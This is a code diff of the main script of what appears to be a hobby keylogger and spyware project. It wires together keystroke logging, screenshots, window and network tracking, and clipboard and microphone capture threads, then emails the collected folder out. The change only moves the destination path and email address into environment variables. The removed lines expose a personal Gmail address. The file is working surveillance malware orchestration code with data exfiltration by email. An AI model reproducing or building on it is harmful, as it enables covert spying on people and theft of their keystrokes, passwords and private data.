@@ -1,5 +1,6 @@
 import time
 import threading
+import os
 
 from functions.basic_keylogger import start_listener, stop_logging
 from functions.computer_information import computer_information
@@ -9,7 +10,11 @@ from functions.track_active_window import track_active_window
 from functions.screenshot import screenshot
 from functions.network_track import track_network
 from functions.send_email_log  import send_folder
+from dotenv import load_dotenv
+load_dotenv()  
 
+email_add= os.getenv("EMAIL_ADDRESS")
+file_path = os.getenv("EMAIL_FILE_PATH")
 # Global variables
 duration = 10  
 screenshot_interval = 5  
@@ -70,7 +75,7 @@ def main():
     clipboard_thread.join()
     microphone_thread.join()
     
-    send_folder("C:/Users/PC-Service/OneDrive/Desktop/project/files/", 
-                "gamingabdou467@gmail.com")
+    send_folder(file_path, 
+                email_add)
 main()
 #hello world how are you today wsup everyonne
